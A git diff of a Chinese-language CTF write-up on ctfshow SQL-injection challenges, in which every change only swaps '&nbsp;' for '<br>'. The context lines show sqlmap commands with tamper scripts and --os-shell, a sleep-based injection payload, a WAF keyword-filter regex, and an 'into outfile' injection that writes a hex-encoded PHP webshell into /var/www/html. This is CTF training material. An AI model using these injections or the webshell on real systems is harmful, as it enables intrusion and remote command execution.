@@ -3602,7 +3602,7 @@ python sqlmap.py -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827005033284.png" alt="image-20250827005033284" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3614,7 +3614,7 @@ python sqlmap.py -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827140733951.png" alt="image-20250827140733951" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3626,7 +3626,7 @@ python sqlmap.py -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827140659057.png" alt="image-20250827140659057" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3638,7 +3638,7 @@ python sqlmap.py -u "http://82cc5813-245f-4089-854c-118e7a273427.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827140825525.png" alt="image-20250827140825525" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3662,7 +3662,7 @@ linux环境下命令
 
 <img src="\images\article_images\image-20250827150653446.png" alt="image-20250827150653446" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3690,7 +3690,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3700,7 +3700,7 @@ python sqlmap.py -u "https://bf28f69c-ae85-47ca-9f6d-0ca9f314dbad.challenge.ctf.
 
 <img src="\images\article_images\image-20250827154802794.png" alt="image-20250827154802794" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3724,7 +3724,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3737,7 +3737,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
 **如果接口接收 原始文本/ `JSON` /表单，`Content-Type` 不匹配，服务器可能直接拒绝请求或报错。**
 **`text/plain` 是告诉服务器：“这是普通文本”，便于 sqlmap 发送参数进行注入测试。**
 
-&nbsp;
+<br>
 
 
 
@@ -3747,7 +3747,7 @@ python sqlmap.py -u "http://9b26b5a1-7edd-4d21-869d-032e10b3d35e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827160037159.png" alt="image-20250827160037159" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3771,7 +3771,7 @@ $sql = "select id,username,password from ctfshow_user where username !='flag' an
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3783,7 +3783,7 @@ python sqlmap.py -u "http://b44a070a-0b0b-4a05-a700-108acfd2ebf6.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827161433716.png" alt="image-20250827161433716" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3807,7 +3807,7 @@ $sql = "select id,username,password from ctfshow_user where id = '".$_GET['id'].
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -3815,13 +3815,13 @@ $sql = "select id,username,password from ctfshow_user where id = '".$_GET['id'].
 
 <img src="\images\article_images\image-20250827163958594.png" alt="image-20250827163958594" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250827163456355.png" alt="image-20250827163456355" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3838,7 +3838,7 @@ $sql = "select id,username,password from ctfshow_user where id = '".$_GET['id'].
 
 **添加 `--safe-url="http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.show/api/getToken.php"` 和  `--safe-freq=1`**
 
-&nbsp;
+<br>
 
 
 
@@ -3848,7 +3848,7 @@ python sqlmap.py -u "http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827170121468.png" alt="image-20250827170121468" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3858,7 +3858,7 @@ python sqlmap.py -u "http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827170710461.png" alt="image-20250827170710461" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3868,7 +3868,7 @@ python sqlmap.py -u "http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827170742936.png" alt="image-20250827170742936" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3878,7 +3878,7 @@ python sqlmap.py -u "http://66fd2785-8f42-4244-9145-39ce1a4fa62a.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827170852040.png" alt="image-20250827170852040" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3902,13 +3902,13 @@ $sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0
   }
 ```
 
-&nbsp;
+<br>
 
 
 
 **sqlmap会自己判断闭合**
 
-&nbsp;
+<br>
 
 
 
@@ -3918,7 +3918,7 @@ python sqlmap.py -u "http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827173631683.png" alt="image-20250827173631683" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3928,7 +3928,7 @@ python sqlmap.py -u "http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827173708626.png" alt="image-20250827173708626" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3938,7 +3938,7 @@ python sqlmap.py -u "http://a6ba1876-ef1a-497a-af7a-c1cd218b30f3.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827173839584.png" alt="image-20250827173839584" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -3962,7 +3962,7 @@ $sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4041,7 +4041,7 @@ versionedmorekeywords.py 		 MySQL >= 5.1.13注释绕过
 halfversionedmorekeywords.py 	 MySQL < 5.1中关键字前加注释
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4053,7 +4053,7 @@ python sqlmap.py -u "http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827174848968.png" alt="image-20250827174848968" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4063,9 +4063,9 @@ python sqlmap.py -u "http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827180354679.png" alt="image-20250827180354679" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
-&nbsp;
+<br>
 
 
 
@@ -4075,7 +4075,7 @@ python sqlmap.py -u "http://1f0b2af7-ba16-42f3-a608-98e28e8dab57.challenge.ctf.s
 
 <img src="\images\article_images\image-20250827180633985.png" alt="image-20250827180633985" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4104,7 +4104,7 @@ $sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0
 
 **考虑绕过空格即可**
 
-&nbsp;
+<br>
 
 
 
@@ -4116,7 +4116,7 @@ python sqlmap.py -u "http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829140827884.png" alt="image-20250829140827884" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4126,7 +4126,7 @@ python sqlmap.py -u "http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829140948975.png" alt="image-20250829140948975" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4136,7 +4136,7 @@ python sqlmap.py -u "http://b0527063-c2a8-4718-b0d1-d0a218ca82e4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829141028830.png" alt="image-20250829141028830" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4161,7 +4161,7 @@ $sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4232,7 +4232,7 @@ def tamper(payload, **kwargs):
     return retVal
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4300,7 +4300,7 @@ def tamper(payload, **kwargs):
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -4310,7 +4310,7 @@ python sqlmap.py -u "http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829144015719.png" alt="image-20250829144015719" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4320,7 +4320,7 @@ python sqlmap.py -u "http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829144059374.png" alt="image-20250829144059374" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4330,7 +4330,7 @@ python sqlmap.py -u "http://84cc13d6-65ad-47e3-910f-265c7b4ed1a4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829144215068.png" alt="image-20250829144215068" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4354,7 +4354,7 @@ $sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4413,7 +4413,7 @@ def tamper(payload, **kwargs):
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -4423,7 +4423,7 @@ python sqlmap.py -u "http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829145637399.png" alt="image-20250829145637399" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4433,7 +4433,7 @@ python sqlmap.py -u "http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829145705804.png" alt="image-20250829145705804" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4443,7 +4443,7 @@ python sqlmap.py -u "http://c58459cd-860c-4305-97d6-d07cb10dc4d4.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829145735940.png" alt="image-20250829145735940" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4472,7 +4472,7 @@ function waf($str){
 
 **增加了对空格的过滤**
 
-&nbsp;
+<br>
 
 
 
@@ -4534,7 +4534,7 @@ def tamper(payload, **kwargs):
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -4544,7 +4544,7 @@ python sqlmap.py -u "http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829150339636.png" alt="image-20250829150339636" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4554,7 +4554,7 @@ python sqlmap.py -u "http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829150407738.png" alt="image-20250829150407738" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4564,7 +4564,7 @@ python sqlmap.py -u "http://e58ad50a-0553-4a24-8033-e233f86876f0.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829150434487.png" alt="image-20250829150434487" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4593,7 +4593,7 @@ function waf($str){
 
 **过滤了 `空格`、`*`**
 
-&nbsp;
+<br>
 
 
 
@@ -4671,7 +4671,7 @@ def bypass(payload):
     return retVal
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4681,7 +4681,7 @@ python sqlmap.py -u "http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829151453253.png" alt="image-20250829151453253" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4691,7 +4691,7 @@ python sqlmap.py -u "http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829151712721.png" alt="image-20250829151712721" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4701,7 +4701,7 @@ python sqlmap.py -u "http://617c81df-36f9-45e8-9aee-16cad9d2d20e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829151802884.png" alt="image-20250829151802884" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4730,7 +4730,7 @@ function waf($str){
 
 **过滤了 `空格`、`*`**
 
-&nbsp;
+<br>
 
 
 
@@ -4775,7 +4775,7 @@ LOAD DATA INFILE '/tmp/file.txt' INTO TABLE ...
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -4783,7 +4783,7 @@ LOAD DATA INFILE '/tmp/file.txt' INTO TABLE ...
 python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.show/api/index.php" --method=PUT --headers="Content-Type:text/plain" --data "id=1" --referer="ctf.show" --safe-url="http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.show/api/getToken.php" --safe-freq=1 --tamper=ctfshow212sqlmap --os-shell
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4804,13 +4804,13 @@ python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.s
 >   - sqlmap 会尝试暴力枚举目录，效率低，噪音大。
 >   - 一般不推荐（CTF 或靶机可以试，真实环境容易被发现）。
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250829161241567.png" alt="image-20250829161241567" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4818,7 +4818,7 @@ python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829161741611.png" alt="image-20250829161741611" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4838,7 +4838,7 @@ python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.s
 //屏蔽危险分子
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4846,7 +4846,7 @@ python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829170925576.png" alt="image-20250829170925576" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4854,7 +4854,7 @@ python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829171152161.png" alt="image-20250829171152161" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4862,7 +4862,7 @@ python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829175153832.png" alt="image-20250829175153832" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4870,7 +4870,7 @@ python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829175258951.png" alt="image-20250829175258951" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4878,7 +4878,7 @@ python sqlmap.py -u "http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.s
 
 <img src="\images\article_images\image-20250829174735829.png" alt="image-20250829174735829" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -4961,7 +4961,7 @@ if __name__ == "__main__":
     print(f"\n最终结果: {result}")
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4981,7 +4981,7 @@ if __name__ == "__main__":
 //屏蔽危险分子
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -4993,7 +4993,7 @@ ip=1' or sleep(3)#&debug=1
 
 <img src="\images\article_images\image-20250829210736421.png" alt="image-20250829210736421" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5001,7 +5001,7 @@ ip=1' or sleep(3)#&debug=1
 
 <img src="\images\article_images\image-20250829211636718.png" alt="image-20250829211636718" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5009,7 +5009,7 @@ ip=1' or sleep(3)#&debug=1
 
 <img src="\images\article_images\image-20250829211759878.png" alt="image-20250829211759878" style="zoom: 80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5017,7 +5017,7 @@ ip=1' or sleep(3)#&debug=1
 
 <img src="\images\article_images\image-20250829211941049.png" alt="image-20250829211941049" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5100,7 +5100,7 @@ if __name__ == "__main__":
     print(f"\n最终结果: {result}")
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5124,7 +5124,7 @@ if __name__ == "__main__":
 
 **`1` 经base64处理后为 `MQ==`**
 
-&nbsp;
+<br>
 
 
 
@@ -5132,7 +5132,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250829225820222.png" alt="image-20250829225820222" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5140,7 +5140,7 @@ if __name__ == "__main__":
 
 <img src="\images\article_images\image-20250829225932720.png" alt="image-20250829225932720" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5150,7 +5150,7 @@ if __name__ == "__main__":
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -5233,7 +5233,7 @@ if __name__ == "__main__":
     print(f"\n最终结果: {result}")
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5256,7 +5256,7 @@ if __name__ == "__main__":
     }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5284,7 +5284,7 @@ SELECT BENCHMARK(1000000, MD5('test'));
 - 执行起来非常慢，数据库 CPU 飙高。
 - 最终返回 `0`。
 
-&nbsp;
+<br>
 
 
 
@@ -5292,7 +5292,7 @@ SELECT BENCHMARK(1000000, MD5('test'));
 
 <img src="\images\article_images\image-20250829235407210.png" alt="image-20250829235407210" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5300,7 +5300,7 @@ SELECT BENCHMARK(1000000, MD5('test'));
 
 <img src="\images\article_images\image-20250829235743971.png" alt="image-20250829235743971" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5308,7 +5308,7 @@ SELECT BENCHMARK(1000000, MD5('test'));
 
 <img src="\images\article_images\image-20250830000202252.png" alt="image-20250830000202252" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5393,7 +5393,7 @@ if __name__ == "__main__":
     print(f"\n最终结果: {result}")
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5416,7 +5416,7 @@ if __name__ == "__main__":
     }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5500,7 +5500,7 @@ WHERE student.id = course.id;
 - **生成组合**
   - 有时我们需要所有可能的组合情况（比如试卷题库出题组合、投资组合），笛卡尔积可以直接拿来用。
 
-&nbsp;
+<br>
 
 
 
@@ -5508,7 +5508,7 @@ WHERE student.id = course.id;
 
 <img src="\images\article_images\image-20250830173433429.png" alt="image-20250830173433429" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5516,7 +5516,7 @@ WHERE student.id = course.id;
 
 <img src="\images\article_images\image-20250830173353600.png" alt="image-20250830173353600" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5524,7 +5524,7 @@ WHERE student.id = course.id;
 
 <img src="\images\article_images\image-20250830174028617.png" alt="image-20250830174028617" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5583,7 +5583,7 @@ print(f"\n最终结果: {flag}")
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5606,7 +5606,7 @@ print(f"\n最终结果: {flag}")
     }  
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5614,7 +5614,7 @@ print(f"\n最终结果: {flag}")
 
 <img src="\images\article_images\image-20250830174919788.png" alt="image-20250830174919788" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5622,7 +5622,7 @@ print(f"\n最终结果: {flag}")
 
 <img src="\images\article_images\image-20250830175032730.png" alt="image-20250830175032730" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5630,7 +5630,7 @@ print(f"\n最终结果: {flag}")
 
 <img src="\images\article_images\image-20250830175300371.png" alt="image-20250830175300371" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5686,7 +5686,7 @@ for i in range(1, max_len + 1):
 print(f"\n最终结果: {flag}")
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5711,7 +5711,7 @@ function waf($str){
 
 **`substr` 用 `left` 代替**
 
-&nbsp;
+<br>
 
 
 
@@ -5728,7 +5728,7 @@ LEFT(str, length)
 - `str`：要截取的字符串。
 - `length`：要截取的字符数。
 
-&nbsp;
+<br>
 
 
 
@@ -5736,7 +5736,7 @@ LEFT(str, length)
 
 <img src="\images\article_images\image-20250831233723349.png" alt="image-20250831233723349" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5776,7 +5776,7 @@ while 1:
             break
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5798,7 +5798,7 @@ limit 注入
 //拿到数据库名字就算你赢
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5876,7 +5876,7 @@ SELECT * FROM users PROCEDURE ANALYSE();
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -5889,7 +5889,7 @@ EXTRACTVALUE(xml_frag, xpath_expr)
 - **第一个参数**：必须是 **合法的 XML 文本字符串（必须是字符串类型，不能是数字、NULL 等）**
 - **第二个参数**：必须是 **合法的 XPath 表达式（必须是字符串，不能为空）**
 
-&nbsp;
+<br>
 
 
 
@@ -5897,7 +5897,7 @@ EXTRACTVALUE(xml_frag, xpath_expr)
 
 **`union` 语句中不允许使用 `PROCEDURE` 子句，因此可以通过报错注入爆出数据库名称**
 
-&nbsp;
+<br>
 
 
 
@@ -5907,7 +5907,7 @@ EXTRACTVALUE(xml_frag, xpath_expr)
 
 **`concat(0x7e, database())` → 拼接成 `"~库名"`。**
 
-&nbsp;
+<br>
 
 
 
@@ -5921,7 +5921,7 @@ EXTRACTVALUE(xml_frag, xpath_expr)
 
 <img src="\images\article_images\image-20250901001703051.png" alt="image-20250901001703051" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -5942,7 +5942,7 @@ group 注入
 //TODO:很安全，不需要过滤
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -5983,7 +5983,7 @@ while True:
     print(res)
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6005,7 +6005,7 @@ group 注入
 //用户名不能是数字
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6013,13 +6013,13 @@ group 注入
 
 <img src="\images\article_images\image-20250901215937095.png" alt="image-20250901215937095" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250901215955039.png" alt="image-20250901215955039" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6097,7 +6097,7 @@ while True:
     print(flag)
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6109,7 +6109,7 @@ while True:
 
 <img src="\images\article_images\image-20250901222311968.png" alt="image-20250901222311968" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6117,7 +6117,7 @@ while True:
 
 <img src="\images\article_images\image-20250901222449332.png" alt="image-20250901222449332" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6125,13 +6125,13 @@ while True:
 
 <img src="\images\article_images\image-20250901222523739.png" alt="image-20250901222523739" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
 **目标：往服务器写入一个 WebShell**
 
-&nbsp;
+<br>
 
 
 
@@ -6145,7 +6145,7 @@ while True:
 
 **`0x3c3f3d60245f4745545b315d603f3e` ：``<?=`$_GET[1]`?>``**
 
-&nbsp;
+<br>
 
 
 
@@ -6166,7 +6166,7 @@ Client UrlCache MMF"');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/va
 *PPD-Adobe: "');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/1.php';--+
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6180,7 +6180,7 @@ Client UrlCache MMF"');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/va
 
 <img src="\images\article_images\image-20250901230751135.png" alt="image-20250901230751135" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6190,7 +6190,7 @@ Client UrlCache MMF"');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/va
 
 <img src="\images\article_images\image-20250901230813032.png" alt="image-20250901230813032" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6214,7 +6214,7 @@ if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|desc
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6235,7 +6235,7 @@ SELECT * FROM ctfshow_flagasa LIMIT 1;
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -6245,7 +6245,7 @@ SELECT * FROM ctfshow_flagasa LIMIT 1;
 
 <img src="\images\article_images\image-20250901232203646.png" alt="image-20250901232203646" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6255,7 +6255,7 @@ SELECT * FROM ctfshow_flagasa LIMIT 1;
 
 <img src="\images\article_images\image-20250901232241515.png" alt="image-20250901232241515" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6265,7 +6265,7 @@ SELECT * FROM ctfshow_flagasa LIMIT 1;
 
 <img src="\images\article_images\image-20250901232344076.png" alt="image-20250901232344076" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6277,7 +6277,7 @@ SELECT * FROM ctfshow_flagasa LIMIT 1;
 
 **`execute` 执行语句**
 
-&nbsp;
+<br>
 
 
 
@@ -6287,7 +6287,7 @@ SELECT * FROM ctfshow_flagasa LIMIT 1;
 
 <img src="\images\article_images\image-20250901234409809.png" alt="image-20250901234409809" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6297,7 +6297,7 @@ SELECT * FROM ctfshow_flagasa LIMIT 1;
 
 <img src="\images\article_images\image-20250901234739228.png" alt="image-20250901234739228" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6321,7 +6321,7 @@ if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|desc
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6348,7 +6348,7 @@ select flagasb from ctfsh_ow_flagas
 0x73656C65637420666C61676173622066726F6D2063746673685F6F775F666C61676173
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6360,7 +6360,7 @@ select flagasb from ctfsh_ow_flagas
 
 <img src="\images\article_images\image-20250901235545621.png" alt="image-20250901235545621" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6370,7 +6370,7 @@ select flagasb from ctfsh_ow_flagas
 
 <img src="\images\article_images\image-20250901235813312.png" alt="image-20250901235813312" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6382,7 +6382,7 @@ select flagasb from ctfsh_ow_flagas
 
 <img src="\images\article_images\image-20250901235843090.png" alt="image-20250901235843090" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6392,7 +6392,7 @@ select flagasb from ctfsh_ow_flagas
 
 <img src="\images\article_images\image-20250901235907842.png" alt="image-20250901235907842" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6424,7 +6424,7 @@ if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|desc
 
 **其中，`ROUTINE_NAME` 字段中存储的是存储过程和函数的名称；`sp_name` 参数表示存储过程或函数的名称。**
 
-&nbsp;
+<br>
 
 
 
@@ -6432,7 +6432,7 @@ if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|desc
 
 **存储过程是事先在数据库中定义好的 SQL 逻辑，可以带参数，也可以返回结果。使用 `call` 可以直接执行这个过程**
 
-&nbsp;
+<br>
 
 
 
@@ -6442,7 +6442,7 @@ select * from information_schema.routines
 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6454,7 +6454,7 @@ select * from information_schema.routines
 
 <img src="\images\article_images\image-20250902001146316.png" alt="image-20250902001146316" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6466,7 +6466,7 @@ select * from information_schema.routines
 
 <img src="\images\article_images\image-20250902001510264.png" alt="image-20250902001510264" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6495,7 +6495,7 @@ select * from information_schema.routines
   }
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6522,7 +6522,7 @@ select flagasba from ctfsh_ow_flagasaa
 0x73656c65637420666c6167617362612066726f6d2063746673685f6f775f666c616761736161
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -6532,7 +6532,7 @@ select flagasba from ctfsh_ow_flagasaa
 
 <img src="\images\article_images\image-20250902002938050.png" alt="image-20250902002938050" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -6542,7 +6542,7 @@ select flagasba from ctfsh_ow_flagasaa
 
 <img src="\images\article_images\image-20250902003018818.png" alt="image-20250902003018818" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
